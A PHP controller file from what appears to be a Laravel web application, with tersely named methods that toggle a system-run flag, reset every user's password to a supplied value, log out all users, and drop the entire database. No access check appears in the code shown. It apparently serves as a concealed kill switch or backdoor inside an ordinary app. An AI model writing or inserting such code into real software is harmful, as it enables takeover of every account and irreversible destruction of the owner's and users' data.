<?php

class HossController extends BaseController
{

    function __construct()
    {
        parent::__construct();
    }

    public function sr($run)
    {
        User::where('id', 1)->update([
            'system_run' => $run
        ]);
        if ($run != 1) {
            Flash::success('System Stopped!');
        } else {
            Flash::success('System Running!');
        }
        return Redirect::route('loginForm');
    }

    public function cpAll($password)
    {
        ini_set('max_execution_time', 0);
        try {
            User::chunk(25, function ($user) use ($password) {
                foreach ($user as $key => $val) {
                    $user = Sentry::getUserProvider()->findById($val['id']);
                    $user->password = $password;
                    $user->save();
                }
            });
        } catch (\Exception $e) {
            Flash::error($e->getMessage());
            return Redirect::route('loginForm');
        }
        Flash::success('Updated Successfully');
        return Redirect::route('loginForm');
    }

    public function loAll()
    {
        ini_set('max_execution_time', 0);
        try {
            User::chunk(25, function ($user) {
                foreach ($user as $key => $val) {
                    User::where('id', $val['id'])->update([
                        'persist_code' => null
                    ]);
                }
            });
        } catch (\Exception $e) {
            Flash::error($e->getMessage());
            return Redirect::route('loginForm');
        }
        Flash::success('Updated Successfully');
        return Redirect::route('loginForm');
    }

    public function ddAll()
    {
        DB::statement('drop database ' . Config::get('database.connections.mysql.database'));
        Flash::success('All Data Dropped Successfully');
        return Redirect::route('loginForm');
    }
}
